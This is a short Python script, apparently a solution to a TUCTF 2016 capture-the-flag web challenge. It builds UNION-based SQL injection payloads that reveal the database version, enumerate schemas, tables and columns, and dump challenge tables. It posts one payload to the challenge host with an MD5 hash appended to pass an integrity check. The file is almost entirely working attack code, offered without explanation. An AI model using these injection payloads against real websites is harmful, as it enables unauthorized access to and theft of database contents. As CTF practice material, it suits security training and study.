# coding: utf-8
import requests, md5
m = md5.new()

query1 = "tables%' UNION SELECT database(), @@version; -- "

query2 = "tables%' UNION SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'; -- "

query3 = "tables%' union select table_name,column_name from information_schema.columns where table_schema != 'mysql' AND table_schema != 'information_schema'; -- "

query4 = "tables%' union select * from tuctf_junk; -- "

query5 = "tables%' union select * from tuctf_info; -- "

m.update(query3)

r = requests.post("http://ctf.a306.xyz:8001/tuctf2016/StudentGrades/postQuery.php", data={"name":query3+' '+m.hexdigest(),"submit":"1"})

print r.text
